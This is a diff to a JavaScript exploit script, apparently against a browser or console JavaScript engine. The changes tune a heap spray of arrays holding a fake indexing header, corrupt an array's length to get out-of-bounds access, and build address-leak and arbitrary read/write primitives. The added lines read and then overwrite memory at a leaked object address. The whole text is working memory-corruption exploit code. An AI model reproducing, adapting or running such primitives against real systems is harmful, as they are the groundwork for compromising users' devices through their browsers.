@@ -238,9 +238,9 @@ BigInt.TYPE_MAP = {
 	"Float64Array": "f64"
 }
 
-//var structs = [];
+var structs = [];
 var oob_arr, slave, master;
-var leak_target, leak_target_addr;
+var leak_target, leak_target_addr, master_addr;
 
 while (true) {
 	var corrupted_idx = -1;
@@ -253,7 +253,7 @@ while (true) {
 	arr.length = 0xfffffff0;
 
 	var new_indexing_header = new BigInt(0x100000, 0x100000);
-	for (var i = 0; i < 0x8000; i++)
+	for (var i = 0; i < 0x3000; i++)
 	{
 	    spray[i] = new Array(0x10).fill(new_indexing_header.d());
 
@@ -271,7 +271,7 @@ while (true) {
 
 	arr.splice(0x1000, 0, 1);
 
-	for (var i = 0; i < 0x8000; i++)
+	for (var i = 0; i < 0x3000; i++)
 	{
 	    if (spray[i].length > 0x10)
 	    {
@@ -319,7 +319,7 @@ while (true) {
 	var marker = new BigInt(0x0, 0x1337);
 	for (var i = 0; i < 0x5000; i++)
 	{
-	    var lookup_idx = 0x65000 + i;
+	    var lookup_idx = i;
 	    var old_val = oob_arr[lookup_idx];
 
 	    if (old_val == undefined) {
@@ -363,16 +363,16 @@ while (true) {
 
 		log(`leak_target_addr: ${leak_target_addr}`);
 
-		//for (var i = 0; i < 0x100; i++)
-        //{
-        //    var a = new Uint32Array(1);
-        //    a[Math.random().toString(36).replace(/[^a-z]+/g, '').slice(0, 5)] = 1337;
-        //    structs.push(a);
-        //}
+		for (var i = 0; i < 0x100; i++)
+        {
+            var a = new Uint32Array(1);
+            a[Math.random().toString(36).replace(/[^a-z]+/g, '').slice(0, 5)] = 1337;
+            structs.push(a);
+        }
 
 		var rw_target = {a: 0, b: 0, c: 0, d: 0};
 
-		rw_target.a = new BigInt(0x1602300, 0x200).d();
+		rw_target.a = new BigInt(0x1602300, 0x84).d();
 		rw_target.b = 0;
 		rw_target.c = slave;
 		rw_target.d = 0x1337;
@@ -388,6 +388,8 @@ while (true) {
 		oob_arr[leak_double_idx+2] = rw_target_addr.d();
 
 		master = prim_spray[leak_prim_idx][1];
+
+		master_addr = new BigInt(master[5], master[4]);
 
 		break;
 	}
@@ -439,9 +441,24 @@ var test = {
 	a: 13.37
 }
 
-log(test);
+log(`test: ${test}`);
+log(`test.a: ${test.a}`);
 
 var addr = prim.leakval(test);
 log(`test addrof: ${addr}`);
+
+var a = new BigInt(addr).add(new BigInt(0, 0x10));
+
+var val = prim.read8(a);
+log(`addrof(test)+0x10 read8: ${val}`);
+log(`addrof(test)+0x10 read8 double: ${val.d()}`);
+
+val = new BigInt(1.1);
+log(`addrof(test)+0x10 write8: ${val}`);
+prim.write8(a, val);
+
+val = prim.read8(a);
+log(`addrof(test)+0x10 read8: ${val}`);
+log(`addrof(test)+0x10 read8 double: ${val.d()}`);
 
 while(true) {}
